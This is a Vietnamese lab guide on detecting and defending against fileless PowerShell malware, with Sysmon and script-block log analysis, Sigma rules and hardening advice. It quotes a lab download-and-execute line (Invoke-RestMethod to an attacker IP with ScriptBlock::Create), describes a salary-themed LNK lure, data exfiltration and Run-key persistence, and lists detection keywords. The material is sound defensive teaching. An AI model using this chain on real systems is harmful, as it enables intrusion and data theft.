# 03 - Detection và phòng thủ

## 1. Tư duy phát hiện Fileless Malware

Với Fileless Malware, không nên chỉ hỏi:

```text
File độc hại nằm ở đâu?
```

Nên hỏi:

```text
Công cụ hợp pháp nào đang bị dùng sai mục đích?
Process nào gọi process nào?
Command line có bất thường không?
Process nào tạo kết nối mạng?
Nội dung script có được PowerShell xử lý không?
Payload có được ghi xuống đĩa không?
```

Trong lab hiện tại, payload không được lưu thành file trên victim. Vì vậy detection phải dựa vào hành vi:

- `explorer.exe` sinh ra `powershell.exe` sau khi người dùng mở LNK.
- `powershell.exe` kết nối tới `192.168.141.1:8000` để tải payload.
- `powershell.exe` kết nối tới `192.168.141.1:8001` để gửi profile.
- PowerShell xử lý nội dung script tải từ HTTP.
- Payload gửi JSON profile về attacker qua `POST /collect`.
- Nếu không có mạng, payload lưu JSON profile vào `%TEMP%\FilelessLab\queue`.
- Payload tạo Registry Run key `FilelessLabDemo` để mô phỏng persistence.
- Không có file payload `.ps1`, `.exe`, `.dll`, `.b64` hoặc `payload-decoded.ps1` trên victim.

## 2. Log cần đọc

### 2.1. Sysmon Event ID 1 - Process Creation

Cần nhìn:

- `Image`: process nào được chạy.
- `ParentImage`: process cha là gì.
- `CommandLine`: lệnh đầy đủ.
- `ParentCommandLine`: lệnh của process cha.
- `User`: user nào chạy.

Trong lab:

```text
explorer.exe -> powershell.exe
```

Điểm đáng chú ý là người dùng mở shortcut từ Explorer nhưng process con lại là PowerShell.

### 2.2. Sysmon Event ID 3 - Network Connection

Cần nhìn:

- Process nào tạo network connection.
- Destination IP.
- Destination Port.
- Process đó có hợp lý không.

Trong lab:

```text
powershell.exe -> 192.168.141.1:8000
powershell.exe -> 192.168.141.1:8001
```

Ý nghĩa:

- PowerShell trên victim đã kết nối máy attacker.
- Đây là bằng chứng network delivery của payload.

### 2.3. Sysmon Event ID 11 - File Create

Cần nhìn:

- File nào được tạo.
- Có file payload nào bị ghi xuống ổ đĩa không.

Trong lab mới, kỳ vọng không thấy:

```text
payload.ps1
payload.exe
payload.dll
payload.b64
payload-decoded.ps1
```

Có thể vẫn thấy:

```text
ThongBaoLuong_Q3.zip
ThongBaoLuong_Q3.lnk
```

Đây là delivery và launcher, không phải payload.

### 2.4. PowerShell Event ID 4104 - Script Block Logging

Cần nhìn:

- Nội dung script được PowerShell xử lý.
- Có `Invoke-RestMethod` không.
- Có `ScriptBlock::Create` không.
- Có dấu hiệu download hoặc execute nội dung từ memory không.

Trong lab:

```text
Invoke-RestMethod 'http://192.168.141.1:8000/payload.ps1'
[ScriptBlock]::Create(...)
```

Kết luận quan trọng:

```text
Fileless không đồng nghĩa với không thể quan sát. Nếu bật logging đúng, defender vẫn có thể thấy dấu vết thực thi.
```

## 3. Detection logic cơ bản

### 3.1. Rule 1 - Explorer sinh PowerShell từ hành vi mở shortcut

Ý tưởng:

```text
Nếu ParentImage là explorer.exe
và Image là powershell.exe
và CommandLine chứa Invoke-RestMethod hoặc ScriptBlock
thì cần điều tra.
```

Lý do:

- Người dùng bình thường mở file từ Explorer hiếm khi cần sinh PowerShell tải nội dung từ HTTP.
- Đây là dấu hiệu phù hợp với LNK launcher.

False positive có thể có:

- Script quản trị nội bộ.
- Công cụ hỗ trợ người dùng.
- Automation hợp pháp.

### 3.2. Rule 2 - PowerShell tải nội dung từ HTTP

Ý tưởng:

```text
Nếu Image là powershell.exe
và CommandLine chứa Invoke-RestMethod hoặc Invoke-WebRequest
và URL trỏ tới IP lạ
thì cần điều tra.
```

Lý do:

- PowerShell có khả năng tải nội dung từ mạng.
- Khi kết hợp với execution, đây là hành vi rủi ro cao.

### 3.3. Rule 3 - PowerShell tạo ScriptBlock từ nội dung tải về

Ý tưởng:

```text
Nếu PowerShell command chứa ScriptBlock::Create
và trước đó có network request
thì cần điều tra.
```

Lý do:

- `ScriptBlock::Create` có thể biến chuỗi text thành code PowerShell để chạy.
- Trong lab, payload được giữ trong RAM rồi thực thi bằng cách này.

### 3.4. Rule 4 - PowerShell tạo kết nối mạng bất thường

Ý tưởng:

```text
Nếu Sysmon Event ID 3 ghi nhận powershell.exe kết nối tới IP/port bất thường
thì cần điều tra.
```

Trong lab:

```text
powershell.exe -> 192.168.141.1:8000
powershell.exe -> 192.168.141.1:8001
```

Port `8000` chứng minh PowerShell tải payload, còn port `8001` chứng minh payload gửi profile về collector. Trong thực tế, thay vì IP lab, có thể là IP public hoặc domain lạ.

### 3.5. Rule 5 - Không có payload file nhưng có execution

Ý tưởng correlation:

```text
Có network download
  + Có PowerShell script execution
  + Không có payload file trên disk
  = nghi vấn in-memory fileless execution
```

Đây là điểm khác biệt quan trọng so với lab cũ có `payload.b64` và `payload-decoded.ps1`.

### 3.6. Rule 6 - Registry Run key tạo persistence

Ý tưởng:

```text
Nếu Registry Run key tạo value mới gọi powershell.exe
thì cần điều tra.
```

Trong lab:

```text
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\FilelessLabDemo
```

Lý do:

- Run key là cơ chế autostart hợp pháp.
- Malware có thể lạm dụng để duy trì khả năng chạy lại sau khi user đăng nhập.
- Lab dùng value dễ nhận biết và có cleanup rõ ràng.

### 3.7. Rule 7 - PowerShell gửi dữ liệu ra ngoài

Ý tưởng:

```text
Nếu powershell.exe vừa tải payload vừa gửi POST về cùng một host
thì cần điều tra.
```

Trong lab:

```text
GET /payload.ps1   trên port 8000
POST /collect      trên port 8001
```

Đây là mô phỏng an toàn của hành vi gửi thông tin máy nạn nhân về attacker.

### 3.8. Rule 8 - Offline staging trong thư mục Temp

Ý tưởng:

```text
Nếu process PowerShell tạo file JSON trong %TEMP%\FilelessLab\queue
thì cần điều tra.
```

Trong lab:

```text
%TEMP%\FilelessLab\queue\victim-profile-*.json
```

Ý nghĩa:

- Đây là mô phỏng hành vi cache/staging dữ liệu khi chưa thể gửi ra ngoài.
- Sysmon Event ID 11 có thể ghi nhận file create.
- Khi mạng quay lại, payload gửi queue về attacker rồi xóa file đã gửi thành công.

## 4. Sigma rule mẫu

### 4.1. Explorer Spawn PowerShell With Web Download

```yaml
title: Explorer Spawns PowerShell With Web Download
id: fileless-lab-explorer-powershell-web-download
status: experimental
description: Detects PowerShell spawned from Explorer with web download indicators, suitable for LNK launcher behavior.
logsource:
  product: windows
  category: process_creation
detection:
  selection_parent:
    ParentImage|endswith: '\explorer.exe'
  selection_img:
    Image|endswith:
      - '\powershell.exe'
      - '\pwsh.exe'
  selection_cli:
    CommandLine|contains:
      - 'Invoke-RestMethod'
      - 'Invoke-WebRequest'
      - 'http://'
      - 'https://'
  condition: selection_parent and selection_img and selection_cli
falsepositives:
  - Helpdesk scripts
  - Internal automation launched by users
level: medium
```

### 4.2. PowerShell ScriptBlock Create From Command Line

```yaml
title: PowerShell ScriptBlock Create From Command Line
id: fileless-lab-powershell-scriptblock-create
status: experimental
description: Detects PowerShell creating ScriptBlock objects from command line content.
logsource:
  product: windows
  category: process_creation
detection:
  selection_img:
    Image|endswith:
      - '\powershell.exe'
      - '\pwsh.exe'
  selection_cli:
    CommandLine|contains:
      - 'ScriptBlock'
      - 'Create'
  condition: selection_img and selection_cli
falsepositives:
  - Advanced administration scripts
  - Development testing
level: medium
```

### 4.3. PowerShell Network Connection

```yaml
title: PowerShell Network Connection To Unusual Destination
id: fileless-lab-powershell-network-connection
status: experimental
description: Detects PowerShell creating a network connection to an unusual destination.
logsource:
  product: windows
  category: network_connection
detection:
  selection:
    Image|endswith:
      - '\powershell.exe'
      - '\pwsh.exe'
  condition: selection
falsepositives:
  - Administration scripts
  - Software deployment
level: low
```

### 4.4. Registry Run Key Calling PowerShell

```yaml
title: Registry Run Key Calling PowerShell
id: fileless-lab-registry-run-powershell
status: experimental
description: Detects a Run key value that launches PowerShell, suitable for persistence simulation detection.
logsource:
  product: windows
  category: registry_set
detection:
  selection_target:
    TargetObject|contains:
      - '\Software\Microsoft\Windows\CurrentVersion\Run\'
  selection_value:
    Details|contains:
      - 'powershell.exe'
      - 'pwsh.exe'
  condition: selection_target and selection_value
falsepositives:
  - Some internal logon scripts
  - Software update helpers
level: medium
```

## 5. Correlation mới là quan trọng

Một dấu hiệu đơn lẻ có thể chưa đủ kết luận.

Ví dụ:

- PowerShell chạy một mình: có thể bình thường.
- PowerShell kết nối mạng: có thể script quản trị hợp pháp.
- ZIP và LNK tồn tại trong Downloads: có thể người dùng tải file bình thường.

Nhưng nếu trong 1-5 phút có chuỗi:

```text
User tải ThongBaoLuong_Q3.zip
  -> giải nén LNK
  -> explorer.exe sinh powershell.exe
  -> powershell.exe kết nối 192.168.141.1:8000
  -> powershell.exe kết nối 192.168.141.1:8001
  -> PowerShell 4104 có Invoke-RestMethod và ScriptBlock::Create
  -> attacker nhận POST /collect kèm victim-profile JSON
  -> nếu mất mạng, file %TEMP%\FilelessLab\queue\victim-profile-*.json xuất hiện
  -> Registry Run key FilelessLabDemo được tạo
  -> không có payload file trên disk
```

thì đây là chuỗi đáng ngờ.

## 6. Phòng thủ

### 6.1. Bật logging đầy đủ

Nên bật:

- Sysmon.
- PowerShell Script Block Logging.
- Security Event ID 4688 kèm command line.
- Centralized logging về SIEM nếu có.

### 6.2. Giám sát LOLBins

Theo dõi các công cụ:

- `powershell.exe`
- `pwsh.exe`
- `cmd.exe`
- `wmic.exe`
- `bitsadmin.exe`
- `certutil.exe`
- `rundll32.exe`
- `regsvr32.exe`
- `mshta.exe`
- `wscript.exe`
- `cscript.exe`

Không phải cứ thấy các process này là độc hại. Cần xem command line, parent process, network connection và ngữ cảnh.

### 6.3. Hạn chế PowerShell

Có thể áp dụng:

- PowerShell Constrained Language Mode.
- Chỉ cho phép signed scripts.
- Chặn PowerShell version cũ nếu không cần.
- Alert khi có `EncodedCommand`, `IEX`, `DownloadString`, `Invoke-RestMethod`, `ScriptBlock::Create`.

### 6.4. AppLocker hoặc WDAC

Dùng để kiểm soát:

- Script nào được chạy.
- Binary nào được chạy.
- User nào được phép chạy công cụ nhạy cảm.

### 6.5. Quản lý email và file nén

Vì nhiều chuỗi fileless bắt đầu từ phishing hoặc file mồi nhử:

- Cảnh báo file ZIP chứa shortcut `.lnk`.
- Scan attachment.
- Đào tạo người dùng về email giả mạo.
- Dùng sandbox email nếu có.

## 7. Cách viết vào báo cáo

Có thể viết:

> Việc phát hiện Fileless Malware không nên dựa duy nhất vào chữ ký file, vì payload có thể không được lưu thành file rõ ràng trên ổ đĩa. Trong bài lab, nạn nhân chỉ tải ZIP và mở shortcut LNK; sau đó PowerShell tải nội dung payload từ máy attacker qua HTTP port `8000`, tạo ScriptBlock trong bộ nhớ và thực thi trực tiếp. Các bằng chứng quan trọng gồm Sysmon Event ID 1 cho chuỗi `explorer.exe -> powershell.exe`, Sysmon Event ID 3 cho kết nối từ PowerShell đến `192.168.141.1:8000` và `192.168.141.1:8001`, PowerShell Event ID 4104 cho nội dung script được xử lý, request `POST /collect` trên collector, và việc không xuất hiện file payload trên victim.
